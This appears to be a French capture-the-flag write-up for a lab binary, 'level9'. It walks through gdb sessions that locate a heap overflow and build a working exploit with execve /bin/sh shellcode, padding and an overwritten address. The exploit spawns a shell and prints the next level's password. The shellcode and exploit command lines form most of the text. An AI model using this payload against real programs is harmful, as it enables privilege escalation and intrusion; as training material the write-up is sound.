# Level 9

Quand on lance `level9` avec gdb et qu'on décompile on peut voir que le programme est écrit en C++. Le programme prend `argv[1]` et le memcpy et nous pouvons voir que ça segfault.

Lorsque nous testons nous pouvons voir que le ça segfault à partir de 108 caractère.

Si nous ecrivons `112 B` l'adresse du registre eax au moment du segfault sera `0x42424242`, nous pouvons alors jump ou nous voulons. Notre but est donc d'écrire le shellcode, padder, et jump à l'adresse du memcpy pour exécuter le shellcode.

```shell
~ gdb level9
(gdb) r $(python -c 'print "B"*112')
Starting program: /home/user/level9/level9 $(python -c 'print "B"*112')
Program received signal SIGSEGV, Segmentation fault.
0x08048682 in main ()
(gdb) info registers
eax            0x42424242	1111638594
ecx            0x42424242	1111638594
[...]
(gdb) x/24xw $eip
[...]
0x804a002:	0x00710000	0x88480000	0x42420804	0x42424242
0x804a012:	0x42424242	0x42424242	0x42424242	0x42424242
0x804a022:	0x42424242	0x42424242	0x42424242	0x42424242
0x804a032:	0x42424242	0x42424242	0x42424242	0x42424242
0x804a042:	0x42424242	0x42424242	0x42424242	0x42424242
0x804a052:	0x42424242	0x42424242	0x42424242	0x42424242
0x804a062:	0x42424242	0x42424242	0x42424242	0x42424242
0x804a072:	0x42424242	0x42424242	0x00004242	0x00000000
[...]
(gdb) r $(python -c 'print "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80" + "B"*84 + "\x0c\xa0\x04\x08"')
Program received signal SIGSEGV, Segmentation fault.
0x6850c031 in ?? ()
(gdb) info registers
eax            0x804a078	134520952
ecx            0x804a00c	134520844
[...]
(gdb) x/24xw 0x0804a008
0x804a008:	0x08048848	0x6850c031	0x68732f6e	0x622f2f68
0x804a018:	0x99e38969	0xe1895352	0x80cd0bb0	0x42424242
0x804a028:	0x42424242	0x42424242	0x42424242	0x42424242
0x804a038:	0x42424242	0x42424242	0x42424242	0x42424242
0x804a048:	0x42424242	0x42424242	0x42424242	0x42424242
0x804a058:	0x42424242	0x42424242	0x42424242	0x42424242
(gdb)
0x804a068:	0x42424242	0x42424242	0x42424242	0x42424242
0x804a078:	0x0804a00c	0x00000000	0x00000000	0x00000000
0x804a088:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a098:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0a8:	0x00000000	0x00000000	0x00000000	0x00000000
0x804a0b8:	0x00000000	0x00000000	0x00000000	0x00000000
(gdb) quit
~ ./level9 $(python -c 'print "\x10\xa0\x04\x08" + "\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x99\x52\x53\x89\xe1\xb0\x0b\xcd\x80" + "B"*80 + "\x0c\xa0\x04\x08"')
$ whoami
bonus0
$ cat /home/user/bonus0/.pass
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```





